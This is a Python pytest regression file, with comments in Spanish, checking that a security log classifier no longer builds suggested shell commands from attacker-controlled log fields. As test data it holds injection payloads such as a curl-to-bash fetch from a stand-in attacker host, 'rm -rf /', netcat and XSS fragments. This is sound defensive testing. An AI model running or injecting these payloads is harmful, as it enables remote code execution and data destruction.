"""Regresión del hallazgo **S-01** — inyección de comando por copiar-pegar.

Antes de la corrección, `classifier.py` interpolaba `username` y `source_ip` de
los logs directamente en `comando_sugerido`. El sistema no ejecutaba nada (eso
sigue certificado en `tests/test_no_autonomy.py`), pero el dashboard le mostraba
al analista un comando armado por el atacante, con una explicación de qué hacía,
para que lo copiara en una terminal con `sudo`.

Estos tests reemplazan a los que estaban congelados en
`test_classifier_bugs_congelados.py::test_S01_*` y afirman el comportamiento
corregido: **si el dato no valida, la acción no se ofrece.**
"""

from __future__ import annotations

import pytest

import classifier
from siem_validators import IP_DESCONOCIDA, safe_token
from tests.conftest import eventos_de_red
from tests.unit.test_validators import PAYLOADS

# Secuencias que, si aparecen en un comando, indican que un dato hostil logró
# cambiar su estructura. No se buscan en el comando entero (la plantilla fija de
# `grep ... | grep ...` tiene una tubería legítima), sino en el payload inyectado.
HUELLAS_DE_INYECCION = (
    "curl http://atacante", "rm -rf", "nc atacante", "$(whoami)", "`id`",
    "DROP TABLE", "alert(document.cookie)", "/etc/passwd",
)


def _comandos(incidentes) -> list[str]:
    return [a["comando_sugerido"] for inc in incidentes
            for a in inc["recommended_actions"] if a.get("comando_sugerido")]


@pytest.fixture
def incidente_cmd_injection(malicious_dir):
    """Solo el fixture del payload de inyección de comando (source_ip 10.0.0.1).

    El directorio `malicious/` tiene además el fixture de XSS, cuyo `username`
    ('bob') sí es válido; mezclarlos haría que las aserciones midieran otra cosa.
    """
    eventos = [e for e in eventos_de_red(malicious_dir)
               if e.get("source_ip") == "10.0.0.1"]
    incidentes = classifier.detect_phishing(eventos)
    assert len(incidentes) == 1
    return incidentes[0]


# ─── El payload original del hallazgo ────────────────────────────────────────

def test_el_payload_del_hallazgo_ya_no_produce_comando(incidente_cmd_injection):
    """El caso exacto reportado: `victima; curl http://atacante/x.sh | bash`."""
    comandos = _comandos([incidente_cmd_injection])

    assert comandos, "el incidente debe seguir existiendo: se omiten acciones, no detección"
    for cmd in comandos:
        assert "curl http://atacante" not in cmd
        assert "; " not in cmd
    assert not any(cmd.startswith("sudo passwd") for cmd in comandos), \
        "la acción de rotar credenciales debe omitirse: el usuario no validó"
    # Lo que sí se puede hacer con datos válidos, se sigue ofreciendo: se bloquea
    # el SERVIDOR de phishing (dest_ip 10.0.0.2), no la víctima que envió las
    # credenciales (source_ip 10.0.0.1).
    assert any("ufw deny from 10.0.0.2" in cmd for cmd in comandos)
    assert not any("10.0.0.1" in cmd for cmd in comandos), "no se bloquea a la víctima"


def test_el_incidente_se_sigue_detectando(malicious_dir):
    """Sanear no puede significar dejar de detectar: el ataque sigue reportado."""
    incidentes = classifier.detect_phishing(eventos_de_red(malicious_dir))
    assert len(incidentes) == 2
    assert all(i["classification"]["attack_type"] == "credential_harvesting"
               for i in incidentes)


def test_el_usuario_hostil_no_aparece_en_ningun_campo(incidente_cmd_injection):
    """Tampoco puede filtrarse por la puerta de atrás (accion, explicacion...)."""
    assert incidente_cmd_injection["target_users"] == []
    for accion in incidente_cmd_injection["recommended_actions"]:
        texto = " ".join(str(v) for v in accion.values())
        for huella in HUELLAS_DE_INYECCION:
            assert huella not in texto

    # Ni en la evidencia ni en las muestras que el panel renderiza.
    serializado = str(incidente_cmd_injection)
    assert "curl http://atacante" not in serializado


# ─── Barrido: ningún payload conocido llega a un comando ─────────────────────

@pytest.mark.parametrize("payload", PAYLOADS)
@pytest.mark.parametrize("tipo", ["ssh_brute_force", "port_scan", "credential_harvesting"])
def test_ningun_payload_sobrevive_al_playbook(tipo, payload):
    """Matriz completa: cada payload × cada tipo de ataque, como IP y como usuario."""
    for acciones in (classifier._playbook(tipo, payload, "testuser"),
                     classifier._playbook(tipo, "10.0.0.1", payload),
                     classifier._playbook(tipo, payload, payload)):
        for accion in acciones:
            cmd = accion.get("comando_sugerido")
            if cmd is None:
                continue
            assert payload not in cmd
            for huella in HUELLAS_DE_INYECCION:
                assert huella not in cmd


def test_el_playbook_rechaza_un_valor_que_esquivo_al_validador(monkeypatch):
    """Última barrera: si un validador se relajara, `_cmd` corta con excepción.

    Se simula un `valid_username` defectuoso que deja pasar un payload. El
    playbook no debe emitir el comando: prefiere fallar ruidosamente a producir
    un comando hostil en silencio.
    """
    monkeypatch.setattr(classifier, "valid_username", lambda v: "bob; rm -rf /")
    with pytest.raises(ValueError, match="no apto para un comando"):
        classifier._playbook("ssh_brute_force", "10.0.0.1", "bob")


# ─── Acciones omitidas en vez de placeholders (cierra también L-03) ──────────

def test_sin_ip_se_omiten_las_acciones_que_la_necesitan():
    acciones = classifier._playbook("ssh_brute_force", None, "testuser")
    comandos = [a["comando_sugerido"] for a in acciones if a.get("comando_sugerido")]
    assert not any("ufw deny" in c for c in comandos)
    assert any("passwd testuser" in c for c in comandos), "lo que sí se puede hacer, se ofrece"


def test_sin_usuario_se_omite_la_rotacion_de_credenciales():
    acciones = classifier._playbook("ssh_brute_force", "10.0.0.1", None)
    comandos = [a["comando_sugerido"] for a in acciones if a.get("comando_sugerido")]
    assert not any("passwd" in c for c in comandos)
    assert any("ufw deny from 10.0.0.1" in c for c in comandos)


def test_sin_ningun_dato_se_escala_a_una_persona():
    """La respuesta honesta cuando no hay nada resoluble: escalar, no inventar."""
    acciones = classifier._playbook("ssh_brute_force", None, None)
    assert all(a["comando_sugerido"] is None or "fail2ban" in a["comando_sugerido"]
               for a in acciones)

    acciones_vacias = classifier._playbook("tipo_desconocido", None, None)
    assert len(acciones_vacias) == 1
    assert "L2" in acciones_vacias[0]["accion"]
    assert acciones_vacias[0]["comando_sugerido"] is None


def test_nunca_se_emite_un_placeholder(incidents):
    """L-03: `<IP_ATACANTE>` y `<USUARIO>` no pueden llegar al analista."""
    for cmd in _comandos(incidents):
        assert "<" not in cmd and ">" not in cmd


def test_el_incidente_confirmado_por_el_siem_trae_su_ip_real(siem_clean):
    """Regresión directa de L-03 con los datos reales del stack."""
    incs = classifier.detect_auth_incidents(siem_clean)
    atacante = next(i for i in incs if i["source_ip"] == "172.18.0.3")
    comandos = [a["comando_sugerido"] for a in atacante["recommended_actions"]
                if a.get("comando_sugerido")]
    assert "sudo ufw deny from 172.18.0.3" in comandos


def test_nunca_se_sugiere_bloquear_a_la_victima(siem_clean):
    """El host atacado (172.18.0.7) no puede terminar en un `ufw deny`.

    Bloquear a la víctima cortaría un servicio legítimo — el falso positivo con
    consecuencias reales que el proyecto entero busca evitar. Con L-02 corregido
    la víctima vive en `victim_hosts` y nunca se usa para armar un comando.
    """
    for inc in classifier.detect_auth_incidents(siem_clean):
        for victima in inc["victim_hosts"]:
            for accion in inc["recommended_actions"]:
                cmd = accion.get("comando_sugerido") or ""
                assert victima not in cmd


# ─── Validación en la frontera de entrada ────────────────────────────────────

def test_una_ip_hostil_no_entra_al_incident_id(malicious_dir):
    """El `incident_id` se renderiza en el panel: no puede llevar datos crudos.

    Congelado antes como `test_S01_ip_hostil_llega_al_incident_id`.
    """
    incidentes = classifier.detect_phishing(eventos_de_red(malicious_dir))
    ids = [i["incident_id"] for i in incidentes]

    assert any(IP_DESCONOCIDA in i for i in ids), "el evento hostil se agrupa bajo el sentinela"
    for incident_id in ids:
        assert "alert(document.cookie)" not in incident_id
        assert safe_token(incident_id)


def test_una_ip_hostil_no_entra_a_attacker_ips(malicious_dir):
    incidentes = classifier.detect_phishing(eventos_de_red(malicious_dir))
    for inc in incidentes:
        for ip in inc["attacker_ips"]:
            assert safe_token(ip)


def test_port_scan_con_ip_hostil_se_agrupa_bajo_el_sentinela():
    eventos = [{"event_type": "network_flow", "source_ip": "1');alert(1);//",
                "dest_ip": "10.0.0.2", "dest_port": p,
                "@timestamp": "2026-09-16T10:00:00.000Z"} for p in range(1, 15)]
    incidentes = classifier.detect_port_scans(eventos)

    assert len(incidentes) == 1, "se sigue detectando el escaneo"
    assert incidentes[0]["source_ip"] == IP_DESCONOCIDA
    assert incidentes[0]["attacker_ips"] == []
    assert not any(a.get("comando_sugerido", "") and "ufw deny" in a["comando_sugerido"]
                   for a in incidentes[0]["recommended_actions"])


# ─── Forma canónica del comando ──────────────────────────────────────────────

def test_comando_argv_coincide_con_el_comando_mostrado(incidents):
    """`comando_argv` existe para que nadie tenga que re-parsear el string."""
    import shlex

    for inc in incidents:
        for accion in inc["recommended_actions"]:
            argv = accion.get("comando_argv")
            if argv is None:
                continue
            assert argv == shlex.split(accion["comando_sugerido"])
            assert all(safe_token(parte) for parte in argv)


def test_los_comandos_provienen_del_catalogo_fijo(incidents):
    """El catálogo vive en `classifier.py` y no cambia por lo que diga un log."""
    catalogo = ("sudo ufw deny from", "grep 'Accepted password'", "sudo passwd",
                "sudo apt-get install -y fail2ban", "sudo ss -tulnp")
    for cmd in _comandos(incidents):
        assert cmd.startswith(catalogo), f"comando fuera del catálogo: {cmd}"
